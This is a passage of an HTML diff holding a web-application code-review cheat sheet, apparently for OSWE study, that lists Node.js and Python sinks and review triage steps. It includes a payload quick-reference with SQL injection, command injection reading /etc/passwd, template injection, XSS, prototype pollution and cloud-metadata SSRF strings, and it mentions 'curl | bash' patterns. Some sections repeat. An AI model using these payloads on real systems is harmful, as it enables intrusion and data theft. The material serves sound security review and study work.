+<li><code>http://127.0.0.1:22</code></li>
+<li><code>http://localhost/admin</code></li>
+<li><code>http://169.254.169.254/latest/meta-data/</code></li>
+<li><code>file:///etc/passwd</code></li>
+</ul>
+</section>
+<section>
+<h3>Final rule</h3>
+<ul>
+<li>identify the framework first</li>
+<li>identify the template engine second</li>
+<li>then identify the real sink</li>
+<li>only after that do you chase input flows and payloads</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="node-js-subtopic-notes"><h2>8. Node.js Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>Node.js web-app review centered on Express, with Koa, Fastify, Hapi, Next.js, NestJS, and raw HTTP patterns</li>
+</ul>
+</section>
+<section>
+<h3>8.0. Identify the Stack</h3>
+<ul>
+<li>Express: <code>const app = express()</code>, <code>app.get</code>, <code>app.post</code>, <code>app.use</code>, <code>router.get</code>, <code>router.use</code>, <code>req.query</code>, <code>req.params</code>, <code>req.body</code>, <code>res.send</code>, <code>res.render</code></li>
+<li>Koa: <code>new Koa()</code>, <code>app.use(async (ctx) =&gt; ...)</code>, <code>ctx.request</code>, <code>ctx.params</code>, <code>ctx.query</code>, <code>ctx.body</code></li>
+<li>Fastify: <code>fastify.get</code>, <code>fastify.post</code>, <code>fastify.route</code>, <code>request.query</code>, <code>request.params</code>, <code>request.body</code>, <code>reply.send()</code></li>
+<li>Hapi: <code>server.route</code>, <code>request.payload</code>, <code>request.query</code>, <code>request.params</code></li>
+<li>Next.js API: <code>pages/api/*</code> or <code>app/api/*/route.js</code>, <code>export default function handler(req, res)</code></li>
+<li>NestJS: <code>@Controller</code>, <code>@Get</code>, <code>@Post</code>, <code>@Body</code>, <code>@Param</code>, <code>@Query</code></li>
+<li>Raw Node HTTP: <code>http.createServer</code>, <code>req.url</code>, <code>new URL(req.url, ...)</code></li>
+</ul>
+</section>
+<section>
+<h3>8.1. Identify the Template Engine</h3>
+<ul>
+<li>EJS: <code>res.render</code>, <code>&lt;%= ... %&gt;</code>, <code>&lt;%- ... %&gt;</code></li>
+<li>Pug/Jade: <code>pug.render</code>, <code>#{...}</code>, <code>!{...}</code></li>
+<li>Handlebars: <code>hbs.render</code>, <code>handlebars.compile</code>, <code>{{ ... }}</code></li>
+<li>Nunjucks: <code>nunjucks.renderString</code>, <code>{{ ... }}</code></li>
+<li>Lodash: <code>_.template</code>, <code>&lt;%= ... %&gt;</code></li>
+<li>React SSR: <code>renderToString</code>, <code>ReactDOMServer.renderToStaticMarkup</code></li>
+</ul>
+</section>
+<section>
+<h3>8.2. The 10 Patterns to Check First</h3>
+<ul>
+<li>Route Precedence and Generic-vs-Specific Confusion: <code>app.get</code>, <code>app.post</code>, <code>app.use</code>, <code>router.use</code>, <code>/:param</code>, regex routes, catch-all routes</li>
+<li>Code Execution:  <code>eval</code>, <code>Function</code>, <code>new Function</code>, <code>vm.runInNewContext</code>, <code>vm.Script</code></li>
+<li>Command Injection:  <code>exec</code>, <code>execSync</code>, <code>spawn</code>, <code>spawnSync</code>, <code>fork</code>, <code>shell: true</code>, <code>bash -c</code>, <code>sh -c</code>, <code>powershell -Command</code></li>
+<li>Insecure Deserialization:  <code>serialize.unserialize</code>, <code>node-serialize</code>, <code>yaml.load</code>, <code>bson.deserialize</code>, <code>msgpack</code>, unsafe object hydration</li>
+<li>Template Injection / SSTI:  <code>res.render</code>, <code>ejs.render</code>, <code>pug.render</code>, <code>handlebars.compile</code>, <code>_.template</code>, <code>nunjucks.renderString</code></li>
+<li>XSS:  <code>res.send</code>, <code>res.end</code>, <code>dangerouslySetInnerHTML</code>, <code>innerHTML</code>, raw HTML return</li>
+<li>File Upload / Write Abuse:  <code>multer</code>, <code>req.files</code>, <code>fs.writeFile</code>, <code>fs.rename</code>, <code>createWriteStream</code>, <code>mv</code></li>
+<li>SQLi:  <code>db.query</code>, <code>knex.raw</code>, <code>sequelize.query</code>, <code>SELECT</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>UNION</code></li>
+<li>Traversal / File Read Abuse:  <code>fs.readFile</code>, <code>fs.createReadStream</code>, <code>path.join</code>, <code>sendFile</code>, <code>res.download</code></li>
+<li>Prototype Pollution / Runtime Mutation:  <code>__proto__</code>, <code>Object.assign</code>, <code>_.merge</code>, <code>lodash.set</code>, <code>req.body</code>, <code>app.locals</code>, <code>global</code></li>
+</ul>
+</section>
+<section>
+<h3>8.3. Routing</h3>
+<ul>
+<li>Express: <code>app.get</code>, <code>app.post</code>, <code>app.put</code>, <code>app.delete</code>, <code>app.use</code>, <code>router.use</code>, <code>router.get</code></li>
+<li>Safe rule: specific before generic; generic before specific = danger</li>
+<li>Check middleware chain order: auth → validation → file upload → static files → business logic</li>
+<li>Search for: <code>app.use</code>, <code>router.use</code>, <code>next()</code>, <code>/:id</code>, <code>*</code>, <code>catchAll</code></li>
+</ul>
+</section>
+<section>
+<h3>8.4. Code Execution</h3>
+<ul>
+<li><code>eval(...)</code>, <code>Function(...)</code>, <code>new Function(...)</code>, <code>vm.runInNewContext(...)</code>, <code>vm.Script(...)</code></li>
+<li><code>exec(...)</code>, <code>execSync(...)</code>, <code>spawn(...)</code>, <code>spawnSync(...)</code>, <code>fork(...)</code></li>
+<li><code>require(...)</code> with dynamic strings, <code>import(...)</code> with runtime user input, <code>module.constructor._load</code></li>
+<li><code>setTimeout(&#x27;...&#x27;)</code>, <code>setInterval(&#x27;...&#x27;)</code> = code execution if string input reaches it</li>
+<li>template render with execution context: EJS/Handlebars/Lodash <code>render</code>, <code>compile</code>, <code>template</code></li>
+<li>search for: <code>exec</code>, <code>spawn</code>, <code>eval</code>, <code>Function</code>, <code>vm</code>, <code>import(</code>, <code>require(</code>, <code>setTimeout</code></li>
+</ul>
+<h4>4.1. RCE in Node: what to look for</h4>
+<ul>
+<li>Any function that spawns a shell or process from external input.</li>
+<li><code>child_process.exec</code>, <code>execSync</code>, <code>spawn</code>, <code>spawnSync</code>, <code>fork</code> with <code>shell: true</code> or a command string built from request data.</li>
+<li>User input placed into <code>cmd</code>, <code>command</code>, <code>script</code>, <code>args</code>, <code>binary</code>, <code>filename</code>, <code>path</code>, <code>target</code> that then enters a shell.</li>
+<li>Dynamic <code>require</code>, <code>import()</code>, or <code>vm</code> execution using user-controlled values.</li>
+<li>Template engines used with untrusted input and server-side rendering.</li>
+<li>Any wrapper around shelling out to <code>bash</code>, <code>sh</code>, <code>powershell</code>, <code>cmd</code>, <code>python</code>, <code>node</code>, <code>curl</code>, <code>wget</code>, <code>perl</code>, <code>ruby</code>.</li>
+</ul>
+<h4>4.2. Real Node RCE patterns</h4>
+<ul>
+<li><code>exec(&quot;cat &quot; + req.query.file)</code></li>
+<li><code>spawn(&quot;bash&quot;, [&quot;-c&quot;, req.body.cmd])</code></li>
+<li><code>execSync(&quot;python -c \&quot;&quot; + req.query.code + &quot;\&quot;&quot;)</code></li>
+<li><code>const c = new Function(req.body.fn)</code></li>
+<li><code>vm.runInNewContext(req.query.code, sandbox)</code></li>
+<li><code>setTimeout(req.query.code, 1000)</code></li>
+<li><code>require(req.params.module)</code> where module path is user-controlled</li>
+<li><code>import(req.query.path)</code> or <code>import(path.join(base, userInput))</code></li>
+</ul>
+<h4>4.3. High-value file names / sinks for Node RCE</h4>
+<ul>
+<li><code>child_process.js</code>, <code>shell.js</code>, <code>exec.js</code>, <code>system.js</code>, <code>utils.js</code>, <code>runner.js</code></li>
+<li><code>command</code>, <code>cmd</code>, <code>script</code>, <code>shell</code>, <code>exec</code>, <code>spawn</code>, <code>fork</code>, <code>bash</code>, <code>powershell</code>, <code>python</code>, <code>node</code></li>
+<li><code>vm.js</code>, <code>sandbox.js</code>, <code>template.js</code>, <code>eval.js</code>, <code>compile.js</code></li>
+<li><code>require</code>, <code>import</code>, <code>module.constructor._load</code>, <code>Function</code>, <code>setTimeout</code>, <code>setInterval</code></li>
+</ul>
+<h4>4.4. High-value endpoint patterns</h4>
+<ul>
+<li><code>/api/run</code>, <code>/api/execute</code>, <code>/api/compile</code>, <code>/api/render</code>, <code>/api/shell</code>, <code>/api/cmd</code>, <code>/api/command</code>, <code>/api/template</code></li>
+<li>routes that accept <code>cmd</code>, <code>code</code>, <code>script</code>, <code>filename</code>, <code>path</code>, <code>template</code>, <code>name</code>, <code>module</code>, <code>eval</code>, <code>expression</code></li>
+<li>debug endpoints, admin tooling, preview routes, report generation endpoints</li>
+<li>file upload handlers that later shell out or execute the uploaded file</li>
+</ul>
+<h4>4.5. What to do when you find it</h4>
+<ul>
+<li>Confirm the sink: is user input flowing directly into <code>exec</code>, <code>spawn</code>, <code>vm</code>, or <code>Function</code>?</li>
+<li>Check whether the call uses <code>shell: true</code> or a string to a shell.</li>
+<li>Confirm the input is attacker-controlled and reachable from a route.</li>
+<li>Determine if the process runs under the same privileges as the app.</li>
+<li>Then assess impact: file read, code execution, data theft, persistence, pivoting.</li>
+</ul>
+<h4>4.6. Quick Node RCE triage flow</h4>
+<ul>
+<li>Step 1: find <code>exec|spawn|fork|eval|Function|vm|import\(|require\(</code></li>
+<li>Step 2: trace input from <code>req.query|req.params|req.body|headers|cookies</code></li>
+<li>Step 3: check whether the value is concatenated into a shell command or JS evaluator</li>
+<li>Step 4: decide if this is direct RCE or only a weak sanitizer gate</li>
+<li>Step 5: write an exploit payload and confirm execution</li>
+</ul>
+</section>
+<section>
+<h3>8.5. Command Injection</h3>
+<ul>
+<li><code>child_process.exec(..., { shell: true })</code></li>
+<li><code>spawn(...)</code>, <code>spawnSync(...)</code>, <code>fork(...)</code> with tainted args or shell wrappers</li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>powershell -Command</code>, <code>cmd /c</code></li>
+<li>user input into <code>cmd</code>, <code>command</code>, <code>exec</code>, <code>shell</code>, <code>bash</code>, <code>sh</code>, <code>script</code>, <code>args</code></li>
+<li><code>shell: true</code> is the big flag</li>
+<li>search for: <code>shell: true</code>, <code>exec(</code>, <code>spawn(</code>, <code>bash -c</code>, <code>cmd /c</code>, <code>powershell</code></li>
+</ul>
+</section>
+<section>
+<h3>8.6. Insecure Deserialization</h3>
+<ul>
+<li><code>serialize.unserialize(...)</code>, <code>node-serialize</code>, <code>yaml.load(...)</code>, <code>yaml.parse(...)</code></li>
+<li><code>bson.deserialize(...)</code>, <code>msgpack.decode(...)</code>, <code>cbor.decode(...)</code></li>
+<li>custom <code>deserialize</code>, <code>decode</code>, <code>load</code>, <code>parse</code>, <code>hydrate</code> on user-controlled input</li>
+<li><code>__proto__</code>, <code>constructor.prototype</code>, <code>prototype pollution</code> via untrusted JSON / query objects</li>
+<li>search for: <code>deserialize</code>, <code>unserialize</code>, <code>yaml.load</code>, <code>parse</code>, <code>hydrate</code>, <code>req.body</code>, <code>Object.assign</code>, <code>merge</code>, <code>__proto__</code></li>
+</ul>
+</section>
+<section>
+<h3>8.7. Templates / SSTI</h3>
+<ul>
+<li>EJS: <code>res.render</code>, <code>&lt;%= ... %&gt;</code>, <code>&lt;%- ... %&gt;</code></li>
+<li>Handlebars: <code>{{ ... }}</code></li>
+<li>Pug/Jade: <code>#{...}</code>, <code>!{...}</code></li>
+<li>Nunjucks: <code>{{ ... }}</code></li>
+<li>Lodash template: <code>&lt;%= ... %&gt;</code> or <code>${...}</code></li>
+<li>route → controller → template → user input</li>
+<li>payloads usually hit <code>{{</code>, <code>{{{</code>, <code>&lt;%=</code>, <code>${...}</code>, <code>#{...}</code></li>
+</ul>
+</section>
+<section>
+<h3>8.8. XSS</h3>
+<ul>
+<li><code>res.send</code>, <code>res.end</code>, <code>res.write</code>, raw HTML return / string interpolation in response</li>
+<li><code>dangerouslySetInnerHTML</code>, <code>innerHTML</code>, <code>document.write</code>, <code>v-html</code></li>
+<li><code>req.query</code>, <code>req.params</code>, <code>req.body</code>, <code>req.headers</code>, <code>cookies</code>, <code>URLSearchParams</code></li>
+<li><code>marked</code>, <code>DOMPurify</code>, <code>sanitize-html</code>, <code>helmet</code> not enough if sink is raw HTML</li>
+<li>search for: <code>res.send(</code>, <code>res.render(</code>, <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>sanitize</code></li>
+</ul>
+</section>
+<section>
+<h3>8.9. File Upload</h3>
+<ul>
+<li><code>multer</code>, <code>busboy</code>, <code>formidable</code>, <code>express-fileupload</code></li>
+<li><code>req.files</code>, <code>fieldname</code>, <code>originalname</code>, <code>mimetype</code>, <code>buffer</code>, <code>path</code>, <code>filename</code></li>
+<li><code>fs.writeFile</code>, <code>fs.rename</code>, <code>mv</code>, <code>rename</code>, <code>createWriteStream</code>, <code>writeFileSync</code></li>
+<li>extension allowlist / blacklist bypass</li>
+<li>path traversal via upload dir + user filename</li>
+<li><code>../</code>, <code>%2e%2e</code>, <code>..%2f</code>, symlinked upload dirs, temp dir reuse</li>
+<li>web shell patterns: <code>.php</code>, <code>.jsp</code>, <code>.aspx</code>, <code>.html</code>, <code>.js</code>, <code>.mjs</code>, <code>.sh</code>, <code>.ps1</code>, <code>.py</code></li>
+<li>search for: <code>multer</code>, <code>req.files</code>, <code>writeFile</code>, <code>originalname</code>, <code>mimetype</code>, <code>upload</code>, <code>rename</code>, <code>mv</code></li>
+</ul>
+</section>
+<section>
+<h3>8.10. SQLi</h3>
+<ul>
+<li><code>db.query(...)</code>, <code>pool.query(...)</code>, <code>connection.query(...)</code>, <code>knex.raw(...)</code>, <code>sequelize.query(...)</code></li>
+<li>raw SQL strings with interpolation, template strings, concatenation, <code>%s</code>, <code>?</code> placeholders and unsafe params</li>
+<li><code>SELECT ... WHERE ...</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>OFFSET</code>, <code>UNION</code>, <code>--</code>, <code>OR 1=1</code>, <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li>if user input reaches <code>WHERE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>OFFSET</code>, or <code>HAVING</code>, inspect closely</li>
+<li>search for: <code>query</code>, <code>raw</code>, <code>knex.raw</code>, <code>sequelize.query</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>UNION</code>, <code>SELECT</code></li>
+</ul>
+</section>
+<section>
+<h3>8.11. Directory Traversal</h3>
+<ul>
+<li><code>fs.readFile</code>, <code>fs.readFileSync</code>, <code>fs.createReadStream</code>, <code>path.join</code>, <code>path.resolve</code>, <code>sendFile</code>, <code>res.download</code></li>
+<li><code>../</code>, <code>..\</code>, <code>%2e%2e</code>, <code>%2f</code>, <code>..%2f</code></li>
+<li>file reads from uploads, templates, logs, configs, caches, temp files</li>
+<li><code>path.normalize</code>, <code>basename</code>, <code>dirname</code> are not security controls by themselves</li>
+<li>zip slip: <code>adm-zip</code>, <code>yazl</code>, <code>unzipper</code>, <code>extract</code></li>
+<li>search for: <code>readFile</code>, <code>createReadStream</code>, <code>sendFile</code>, <code>download</code>, <code>path.join</code>, <code>normalize</code>, <code>extract</code></li>
+</ul>
+</section>
+<section>
+<h3>8.12. Prototype Pollution / Object Mutation</h3>
+<ul>
+<li><code>__proto__</code>, <code>prototype</code>, <code>constructor.prototype</code>, <code>Object.assign</code>, <code>lodash.merge</code>, <code>_.set</code>, <code>merge</code></li>
+<li><code>req.body</code>, <code>req.query</code>, <code>req.params</code>, <code>JSON.parse</code>, <code>qs.parse</code>, <code>body-parser</code> without strict handling</li>
+<li><code>app.locals</code>, <code>req.app.locals</code>, <code>global</code>, <code>config</code>, <code>process.env</code>, <code>Object.defineProperty</code></li>
+<li>user-controlled keys mutating auth, roles, config, route maps, defaults</li>
+<li>patching imported framework or library internals after load</li>
+<li>search for: <code>__proto__</code>, <code>Object.assign</code>, <code>merge</code>, <code>_.set</code>, <code>req.body</code>, <code>app.locals</code>, <code>global</code>, <code>prototype</code>, <code>config</code></li>
+</ul>
+</section>
+<section>
+<h3>8.13. Auth / Session</h3>
+<ul>
+<li><code>req.session</code>, <code>res.cookie</code>, <code>cookie-parser</code>, <code>express-session</code>, <code>jwt</code>, <code>jsonwebtoken</code>, <code>passport</code></li>
+<li><code>req.isAuthenticated()</code>, <code>requireAuth</code>, <code>authorize</code>, <code>isAdmin</code>, <code>isAuthenticated</code>, <code>verify</code></li>
+<li><code>set-cookie</code>, <code>secure</code>, <code>httpOnly</code>, <code>sameSite</code>, <code>signed</code>, <code>cookie secret</code>, <code>maxAge</code></li>
+<li><code>Authorization</code>, <code>Bearer</code>, <code>token</code>, <code>secret</code>, <code>auth</code>, <code>role</code>, <code>admin</code>, <code>permissions</code></li>
+<li><code>app.set(&#x27;secret&#x27;, ...)</code>, <code>jwt.sign</code>, <code>jwt.verify</code>, <code>express-jwt</code>, <code>koa-jwt</code></li>
+<li>search for: <code>session</code>, <code>cookie</code>, <code>secret</code>, <code>token</code>, <code>Authorization</code>, <code>passport</code>, <code>jwt</code>, <code>auth</code></li>
+</ul>
+</section>
+<section>
+<h3>8.14. SSRF</h3>
+<ul>
+<li><code>fetch()</code>, <code>axios.get()</code>, <code>axios.post()</code>, <code>got()</code>, <code>node-fetch</code>, <code>undici</code>, <code>http.request()</code>, <code>https.request()</code></li>
+<li><code>redirects</code>, <code>follow</code>, <code>proxy</code>, <code>verifySSL</code>, <code>timeout</code>, <code>agent</code>, <code>responseType</code></li>
+<li><code>new URL()</code>, <code>URL</code> concatenation, <code>req.protocol</code>, <code>baseURL</code>, <code>joinURL</code>, <code>encodeURI</code></li>
+<li>internal IP / localhost checks: <code>127.0.0.1</code>, <code>localhost</code>, <code>10.0.0.0/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>169.254.169.254</code></li>
+<li>search for: <code>fetch</code>, <code>axios</code>, <code>got</code>, <code>http.request</code>, <code>URL</code>, <code>redirects</code>, <code>localhost</code>, <code>internal</code></li>
+</ul>
+</section>
+<section>
+<h3>8.15. XML / XXE</h3>
+<ul>
+<li><code>xml2js</code>, <code>fast-xml-parser</code>, <code>sax</code>, <code>xmldom</code>, <code>libxmljs</code>, <code>xml-js</code></li>
+<li><code>parse</code>, <code>parseString</code>, <code>DOMParser</code>, <code>XMLParser</code>, <code>XMLReader</code></li>
+<li><code>&lt;!DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+<li>search for: <code>parse</code>, <code>XML</code>, <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+</ul>
+</section>
+<section>
+<h3>8.16. Mass Assignment / Object Hydration</h3>
+<ul>
+<li><code>const user = new User(req.body)</code>, <code>Object.assign(user, payload)</code>, <code>Object.assign({}, req.body)</code></li>
+<li><code>const obj = { ...req.body }</code>, <code>const data = req.body</code>, <code>querystring.parse()</code>, <code>qs.parse()</code></li>
+<li><code>lodash.set</code>, <code>_.merge</code>, <code>Object.fromEntries</code>, <code>Reflect.set</code>, <code>req.body = ...</code></li>
+<li><code>mongo</code>, <code>mongoose</code>, <code>sequelize</code>, <code>typeorm</code>, <code>Prisma</code>, <code>DTO</code> hydration from request input to model objects</li>
+<li>search for: <code>...req.body</code>, <code>Object.assign</code>, <code>merge</code>, <code>req.body</code>, <code>new User</code>, <code>new Model</code>, <code>model.create</code>, <code>save()</code></li>
+</ul>
+</section>
+<section>
+<h3>8.17. Unsafe File Ops</h3>
+<ul>
+<li><code>fs.unlink</code>, <code>fs.rm</code>, <code>fs.rmdir</code>, <code>fs.rmSync</code>, <code>fs.unlinkSync</code>, <code>rimraf</code></li>
+<li><code>fs.writeFile</code>, <code>fs.writeFileSync</code>, <code>fs.appendFile</code>, <code>createWriteStream</code>, <code>rename</code>, <code>move</code>, <code>mv</code></li>
+<li>temp files, uploads, logs, caches, exports, generated artifacts from user input</li>
+<li>treat config/cache/upload state changes as security-sensitive</li>
+<li>search for: <code>unlink</code>, <code>rm</code>, <code>rmdir</code>, <code>writeFile</code>, <code>appendFile</code>, <code>rename</code>, <code>tmp</code>, <code>upload</code></li>
+</ul>
+</section>
+<section>
+<h3>8.18. CSRF / Session State</h3>
+<ul>
+<li><code>csrf</code>, <code>csurf</code>, <code>csrfSync</code>, <code>sameSite</code>, <code>secure</code>, <code>httpOnly</code>, <code>signedCookies</code>, <code>cookie-parser</code></li>
+<li><code>validateCsrf</code>, <code>csrfProtection</code>, <code>csrfToken</code>, <code>X-CSRF-Token</code></li>
+<li>session fixation via reused tokens, cookies, login state</li>
+<li>search for: <code>csrf</code>, <code>csurf</code>, <code>sameSite</code>, <code>cookie</code>, <code>csrfToken</code>, <code>validateCsrf</code></li>
+</ul>
+</section>
+<section>
+<h3>8.19. Rabbit Holes</h3>
+<ul>
+<li><code>trim()</code>, <code>toLowerCase()</code>, <code>replace()</code>, <code>slice()</code>, <code>split()</code>, <code>match()</code>, <code>normalize()</code></li>
+<li><code>Math.random()</code>, <code>crypto.randomBytes()</code>, <code>uuid.v4()</code>, <code>Date.now()</code></li>
+<li><code>crypto.createHash(&#x27;sha256&#x27;)</code>, <code>md5</code>, <code>bcrypt</code>, <code>argon2</code></li>
+<li><code>regex.test()</code>, <code>RegExp</code>, <code>new URL()</code>, <code>decodeURIComponent()</code></li>
+<li><code>path.resolve()</code>, <code>path.normalize()</code>, <code>startsWith()</code>, <code>endsWith()</code>, <code>includes()</code>, <code>indexOf()</code></li>
+<li>these are usually not bugs by themselves; they matter only if they gate a sink</li>
+<li>if it never reaches a sink, move on</li>
+</ul>
+</section>
+<section>
+<h3>8.20. KPI’s / High-Value Files</h3>
+<ul>
+<li><code>app.js</code>, <code>server.js</code>, <code>index.js</code>, <code>config.js</code>, <code>db.js</code>, <code>database.js</code>, <code>settings.js</code></li>
+<li><code>process.env</code>, <code>dotenv</code>, <code>config</code>, <code>nconf</code>, <code>convict</code></li>
+<li><code>global</code>, <code>app.locals</code>, <code>req.app.locals</code>, <code>Object.assign</code>, <code>Reflect</code></li>
+<li><code>require</code>, <code>import()</code>, <code>eval</code>, <code>Function</code>, <code>child_process</code>, <code>vm</code></li>
+<li><code>jwt</code>, <code>session</code>, <code>cookie</code>, <code>database</code>, <code>ORM</code>, <code>redis</code>, <code>mongoose</code>, <code>sequelize</code></li>
+</ul>
+</section>
+<section>
+<h3>Quick Review Rule</h3>
+<ul>
+<li>Start with the sink: shell, eval, file write, template render, SQL, file open, session/auth.</li>
+<li>Trace the user input backward.</li>
+<li>If the “fix” is only <code>trim()</code>, <code>toLowerCase()</code>, <code>replace()</code>, regex, or normalization, it is usually a rabbit hole unless it gates a real sink.</li>
+<li>Best OSWE clue: dynamic import + object mutation + prototype pollution + config + runtime globals.</li>
+</ul>
+</section>
+<section>
+<h3>Useful Search Terms</h3>
+<ul>
+<li><code>eval|Function|vm|exec|spawn|fork|shell</code></li>
+<li><code>res\.render|ejs|pug|handlebars|nunjucks|template</code></li>
+<li><code>fs\.readFile|fs\.writeFile|path\.join|sendFile|download</code></li>
+<li><code>query\(|raw\(|knex\.raw|sequelize\.query|ORDER BY|LIMIT|UNION</code></li>
+<li><code>req\.body|__proto__|Object\.assign|lodash|merge|set\(</code></li>
+<li><code>fetch\(|axios|got|http\.request|https\.request|new URL</code></li>
+<li><code>session|cookie|jwt|Authorization|passport|csrf|csurf</code></li>
+</ul>
+</section>
+<section>
+<h3>Payloads / Quick Reference</h3>
+<h4>RCE Checklist</h4>
+<ul>
+<li><code>exec|execSync|spawn|spawnSync|fork|eval|new Function|vm.runInNewContext</code></li>
+<li><code>shell: true</code>, <code>bash -c</code>, <code>sh -c</code>, <code>cmd /c</code>, <code>powershell -Command</code></li>
+<li><code>req.query|req.params|req.body|headers|cookies</code> flowing into command strings</li>
+<li>user input concatenated into <code>cmd</code>, <code>command</code>, <code>script</code>, <code>filename</code>, <code>path</code>, <code>module</code>, <code>code</code></li>
+</ul>
+<h4>SQLi</h4>
+<ul>
+<li><code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li><code>admin&#x27; --</code></li>
+<li><code>UNION SELECT NULL--</code></li>
+<li><code>ORDER BY 1--</code></li>
+</ul>
+<h4>Command Injection</h4>
+<ul>
+<li><code>; id;</code></li>
+<li><code>&amp;&amp; whoami</code></li>
+<li><code>| cat /etc/passwd</code></li>
+<li><code>$(id)</code></li>
+<li>`<code> </code>id<code> </code>`</li>
+<li><code>bash -c &#x27;id&#x27;</code></li>
+</ul>
+<h4>Traversal / File Reads</h4>
+<ul>
+<li><code>../../etc/passwd</code></li>
+<li><code>..\..\windows\win.ini</code></li>
+<li><code>%2e%2e%2fetc/passwd</code></li>
+<li><code>../secret.txt</code></li>
+</ul>
+<h4>Template Injection / SSTI</h4>
+<ul>
+<li><code>{{7*7}}</code></li>
+<li><code>{{constructor.constructor(&#x27;return process&#x27;)()}}</code></li>
+<li><code>&lt;%= 7*7 %&gt;</code></li>
+<li><code>${7*7}</code></li>
+<li><code>#{7*7}</code></li>
+</ul>
+<h4>XSS / HTML Injection</h4>
+<ul>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li><code>&quot;&gt;&lt;svg/onload=alert(1)&gt;</code></li>
+<li><code>javascript:alert(1)</code></li>
+</ul>
+<h4>Prototype Pollution / Object Mutation</h4>
+<ul>
+<li><code>__proto__.admin=true</code></li>
+<li><code>constructor.prototype.admin=true</code></li>
+<li><code>{&quot;__proto__&quot;:{&quot;admin&quot;:true}}</code></li>
+<li><code>?role[__proto__][admin]=true</code></li>
+</ul>
+<h4>SSRF</h4>
+<ul>
+<li><code>http://127.0.0.1:22</code></li>
+<li><code>http://localhost/admin</code></li>
+<li><code>http://169.254.169.254/latest/meta-data/</code></li>
+<li><code>file:///etc/passwd</code></li>
+</ul>
+</section>
+<section>
+<h3>Final rule</h3>
+<ul>
+<li>identify the framework first</li>
+<li>identify the template engine second</li>
+<li>then identify the real sink</li>
+<li>only after that do you chase input flows and payloads</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="python-subtopic-notes"><h2>9. Python Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>Python web-app review across Flask, Django, FastAPI, Quart, and Bottle, focused on routing, templates, sinks, and object handling</li>
+</ul>
+</section>
+<section>
+<h3>9.0. The 10 Patterns to Check First</h3>
+<ul>
+<li>Route Precedence and Generic-vs-Specific Confusion: <code>@app.route</code> / <code>@app.get</code> / <code>path()</code> / regex routing</li>
+<li>Code Execution: <code>eval</code>, <code>exec</code>, <code>compile</code>, <code>__import__</code>, <code>importlib</code>, <code>getattr(..., tainted_input)</code></li>
+<li>Command Injection: <code>subprocess</code>, <code>os.system</code>, <code>Popen</code>, <code>shell=True</code>, <code>bash -c</code>, <code>python -c</code></li>
+<li>Unsafe Deserialization: <code>pickle.loads</code>, <code>yaml.load</code>, <code>marshal.loads</code>, <code>__reduce__</code></li>
+<li>SSTI / Template Injection: <code>render_template</code>, <code>Template(...)</code>, <code>{{ ... }}</code>, <code>${...}</code></li>
+<li>XSS: <code>request.*</code>, <code>Response</code>, <code>HttpResponse</code>, <code>mark_safe</code>, <code>|safe</code></li>
+<li>File Upload / Write Abuse: <code>request.files</code>, <code>save</code>, <code>secure_filename</code>, <code>open</code>, <code>Path.write_*</code></li>
+<li>SQLi: <code>execute</code>, <code>query.filter</code>, <code>session.execute</code>, <code>LIMIT</code>, <code>ORDER BY</code>, <code>UNION</code></li>
+<li>Traversal / File Read Abuse: <code>open</code>, <code>Path</code>, <code>send_file</code>, <code>../</code>, <code>%2e%2e</code>, <code>zipfile.extract*</code></li>
+<li>Runtime Mutation, Config Abuse, Object Hydration: <code>__dict__</code>, <code>setattr</code>, <code>getattr</code>, <code>globals</code>, <code>locals</code>, <code>config</code> / <code>app.config</code></li>
+</ul>
+<!-- 
+</section>
+<section>
+<h3>9.1. Routing</h3>
+<ul>
+<li>Flask: <code>@app.route</code>, <code>@app.get</code>, <code>@app.post</code>, <code>@app.put</code>, <code>@app.delete</code></li>
+<li>Django: <code>path()</code>, <code>re_path()</code>, <code>urlpatterns</code></li>
+<li>FastAPI: <code>@app.get</code>, <code>@app.post</code>, <code>{param}</code> in path</li>
+<li>Quart: <code>@app.route</code>, async handlers</li>
+<li>Bottle: <code>@route</code>, <code>@get</code>, <code>@post</code></li>
+<li>CherryPy: <code>@cherrypy.expose</code></li>
+<li>Custom WSGI/ASGI: <code>dispatch()</code>, <code>request.path</code>, regex routing</li>
+</ul>
+- Safe rule: specific before generic; generic before specific = danger -->
+<!-- ## 2. Code Execution
+<ul>
+<li><code>eval(...)</code>, <code>exec(...)</code>, <code>compile(...)</code></li>
+<li><code>os.system(...)</code>, <code>subprocess.run(...)</code>, <code>Popen(...)</code>, <code>check_output(...)</code>, <code>call(...)</code></li>
+<li><code>commands.getoutput(...)</code>, <code>getstatusoutput(...)</code>, <code>shell=True</code></li>
+<li><code>__import__(...)</code>, <code>importlib.import_module(...)</code>, <code>importlib.reload(...)</code></li>
+<li><code>getattr(obj, tainted_input)(...)</code></li>
+<li>template render with execution context: Jinja/Template <code>render</code>, <code>format</code>, <code>Template(...)</code></li>
+</ul>
+- search for: `cmd`, `command`, `shell`, `exec`, `eval`, `compile`, `globals`, `locals` -->
+<!-- 
+</section>
+<section>
+<h3>9.3. Command Injection</h3>
+<ul>
+<li><code>subprocess.run(..., shell=True)</code></li>
+<li><code>subprocess.Popen(...)</code>, <code>check_output(...)</code>, <code>call(...)</code></li>
+<li><code>os.system(...)</code>, <code>os.popen(...)</code></li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>python -c</code>, <code>curl ... | bash</code>, <code>wget ... | sh</code></li>
+<li>user input into <code>cmd</code>, <code>command</code>, <code>exec</code>, <code>shell</code>, <code>bash</code>, <code>sh</code></li>
